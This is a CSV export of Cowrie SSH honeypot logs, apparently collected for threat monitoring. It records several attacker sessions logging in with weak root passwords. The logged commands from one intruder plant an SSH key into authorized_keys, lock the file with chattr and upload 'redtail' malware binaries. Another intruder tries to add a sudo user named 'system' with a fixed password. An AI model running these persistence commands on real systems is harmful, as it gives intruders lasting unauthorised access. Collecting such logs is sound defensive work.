"TimeGenerated [UTC]","Timestamp [UTC]",RawData,Message,Severity,TenantId,Type,"_ResourceId"
"9/20/2024, 6:59:24.139 AM",,"{""eventid"":""cowrie.login.success"",""username"":""root"",""password"":""pass"",""message"":""login attempt [root/pass] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.136800Z"",""src_ip"":""128.199.225.7"",""session"":""8fe108a89762""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:24.386 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":1.592932939529419,""message"":""Connection lost after 1 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.384887Z"",""src_ip"":""128.199.225.7"",""session"":""8fe108a89762""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:24.484 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""5.182.211.148"",""src_port"":57380,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""de6aa0229f39"",""protocol"":""ssh"",""message"":""New connection: 5.182.211.148:57380 (10.0.0.4:2222) [session: de6aa0229f39]"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.481345Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:24.484 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.482864Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:24.567 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""5f904648ee8964bef0e8834012e26003"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""rsa-sha2-512-cert-v01@openssh.com"",""rsa-sha2-256-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""ssh-dss-cert-v01@openssh.com"",""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ssh-ed25519-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""aes256-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 5f904648ee8964bef0e8834012e26003"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.565121Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:24.816 AM",,"{""eventid"":""cowrie.login.success"",""username"":""root"",""password"":""pass"",""message"":""login attempt [root/pass] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:24.815629Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.852 AM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.850594Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.853 AM",,"{""eventid"":""cowrie.command.input"",""input"":""chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \""\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"""",""message"":""CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \""\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"""",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.852451Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.945 AM",,"{""eventid"":""cowrie.session.file_download"",""duplicate"":false,""outfile"":""var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b"",""shasum"":""8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b"",""destfile"":""/root/.ssh/authorized_keys"",""message"":""Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.941899Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.947 AM",,"{""eventid"":""cowrie.log.closed"",""ttylog"":""var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6"",""size"":200,""shasum"":""4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6"",""duplicate"":false,""duration"":0.0936119556427002,""message"":""Closing TTY Log: var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6 after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.943478Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.955 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""clean.sh"",""outfile"":""var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e"",""shasum"":""d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e"",""message"":""SFTP Uploaded file \""clean.sh\"" to var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.948358Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:40.992 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""redtail.arm7"",""outfile"":""var/lib/cowrie/downloads/e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746"",""shasum"":""e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746"",""message"":""SFTP Uploaded file \""redtail.arm7\"" to var/lib/cowrie/downloads/e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:40.968162Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:41.019 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""redtail.arm8"",""outfile"":""var/lib/cowrie/downloads/88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97"",""shasum"":""88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97"",""message"":""SFTP Uploaded file \""redtail.arm8\"" to var/lib/cowrie/downloads/88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:41.014741Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:41.052 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""redtail.i686"",""outfile"":""var/lib/cowrie/downloads/42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98"",""shasum"":""42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98"",""message"":""SFTP Uploaded file \""redtail.i686\"" to var/lib/cowrie/downloads/42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:41.047776Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:41.085 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""redtail.x86_64"",""outfile"":""var/lib/cowrie/downloads/eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d"",""shasum"":""eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d"",""message"":""SFTP Uploaded file \""redtail.x86_64\"" to var/lib/cowrie/downloads/eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:41.079800Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:41.094 AM",,"{""eventid"":""cowrie.session.file_upload"",""filename"":""setup.sh"",""outfile"":""var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae"",""shasum"":""3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae"",""message"":""SFTP Uploaded file \""setup.sh\"" to var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:41.087707Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:41.105 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":16.612287044525146,""message"":""Connection lost after 16 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:41.095006Z"",""src_ip"":""5.182.211.148"",""session"":""de6aa0229f39""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:52.810 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""183.81.169.238"",""src_port"":52364,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""4188f92af0d3"",""protocol"":""ssh"",""message"":""New connection: 183.81.169.238:52364 (10.0.0.4:2222) [session: 4188f92af0d3]"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:52.809401Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:53.444 AM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:53.443277Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:53.446 AM",,"{""eventid"":""cowrie.client.kex"",""hassh"":""4e066189c3bbeec38c99b1855113733a"",""hasshAlgorithms"":""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"",""kexAlgs"":[""curve25519-sha256"",""curve25519-sha256@libssh.org"",""ecdh-sha2-nistp256"",""ecdh-sha2-nistp384"",""ecdh-sha2-nistp521"",""diffie-hellman-group14-sha256"",""diffie-hellman-group14-sha1"",""ext-info-c""],""keyAlgs"":[""rsa-sha2-512-cert-v01@openssh.com"",""rsa-sha2-256-cert-v01@openssh.com"",""ssh-rsa-cert-v01@openssh.com"",""ssh-dss-cert-v01@openssh.com"",""ecdsa-sha2-nistp256-cert-v01@openssh.com"",""ecdsa-sha2-nistp384-cert-v01@openssh.com"",""ecdsa-sha2-nistp521-cert-v01@openssh.com"",""ssh-ed25519-cert-v01@openssh.com"",""ecdsa-sha2-nistp256"",""ecdsa-sha2-nistp384"",""ecdsa-sha2-nistp521"",""rsa-sha2-512"",""rsa-sha2-256"",""ssh-rsa"",""ssh-dss"",""ssh-ed25519""],""encCS"":[""aes128-gcm@openssh.com"",""chacha20-poly1305@openssh.com"",""aes128-ctr"",""aes192-ctr"",""aes256-ctr""],""macCS"":[""hmac-sha2-256-etm@openssh.com"",""hmac-sha2-256"",""hmac-sha1"",""hmac-sha1-96""],""compCS"":[""none""],""langCS"":[""""],""message"":""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:53.444568Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:55.094 AM",,"{""eventid"":""cowrie.login.success"",""username"":""root"",""password"":""0"",""message"":""login attempt [root/0] succeeded"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:55.093589Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.475 AM",,"{""eventid"":""cowrie.session.params"",""arch"":""linux-x64-lsb"",""message"":[],""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.474341Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.476 AM",,"{""eventid"":""cowrie.command.input"",""input"":""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aRtxS5DQ) system && sudo usermod -aG sudo system"",""message"":""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aRtxS5DQ) system && sudo usermod -aG sudo system"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.475847Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.479 AM",,"{""eventid"":""cowrie.command.input"",""input"":""openssl passwd -1 aRtxS5DQ"",""message"":""CMD: openssl passwd -1 aRtxS5DQ"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.477525Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.481 AM",,"{""eventid"":""cowrie.command.failed"",""input"":""openssl passwd -1 aRtxS5DQ"",""message"":""Command not found: openssl passwd -1 aRtxS5DQ"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.480612Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.486 AM",,"{""eventid"":""cowrie.command.failed"",""input"":""apt update"",""message"":""Command not found: apt update"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.484154Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.538 AM",,"{""eventid"":""cowrie.command.failed"",""input"":""apt install sudo curl -y"",""message"":""Command not found: apt install sudo curl -y"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.486785Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.879 AM",,"{""eventid"":""cowrie.log.closed"",""ttylog"":""var/lib/cowrie/tty/b9effa1884983860b5cf1d96789d066b077c07b85c793e80a07cab1e05fba938"",""size"":725,""shasum"":""b9effa1884983860b5cf1d96789d066b077c07b85c793e80a07cab1e05fba938"",""duplicate"":false,""duration"":0.40526723861694336,""message"":""Closing TTY Log: var/lib/cowrie/tty/b9effa1884983860b5cf1d96789d066b077c07b85c793e80a07cab1e05fba938 after 0 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.878874Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 6:59:56.881 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":4.070003986358643,""message"":""Connection lost after 4 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T06:59:56.880714Z"",""src_ip"":""183.81.169.238"",""session"":""4188f92af0d3""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:22:14.573 AM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""140.249.182.238"",""src_port"":33390,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""1d8486634081"",""protocol"":""ssh"",""message"":""New connection: 140.249.182.238:33390 (10.0.0.4:2222) [session: 1d8486634081]"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:22:14.572114Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 10:22:19.672 AM",,"{""eventid"":""cowrie.session.closed"",""duration"":5.0978147983551025,""message"":""Connection lost after 5 seconds"",""sensor"":""server01"",""timestamp"":""2024-09-20T10:22:19.671309Z"",""src_ip"":""140.249.182.238"",""session"":""1d8486634081""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:06:26.584 PM",,"{""eventid"":""cowrie.session.connect"",""src_ip"":""143.110.159.157"",""src_port"":37600,""dst_ip"":""10.0.0.4"",""dst_port"":2222,""session"":""321c943debf1"",""protocol"":""ssh"",""message"":""New connection: 143.110.159.157:37600 (10.0.0.4:2222) [session: 321c943debf1]"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:06:26.582736Z""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
"9/20/2024, 1:06:26.617 PM",,"{""eventid"":""cowrie.client.version"",""version"":""SSH-2.0-Go"",""message"":""Remote SSH version: SSH-2.0-Go"",""sensor"":""server01"",""timestamp"":""2024-09-20T13:06:26.616987Z"",""src_ip"":""143.110.159.157"",""session"":""321c943debf1""}
",,,"b3e3b5d0-8c0b-43a4-80ac-2965c6cfdfa0","newCowrie_CL","/subscriptions/1598f60c-b2fc-444f-af68-e88b999bc0c2/resourcegroups/rgtisensor/providers/microsoft.compute/virtualmachines/server01"
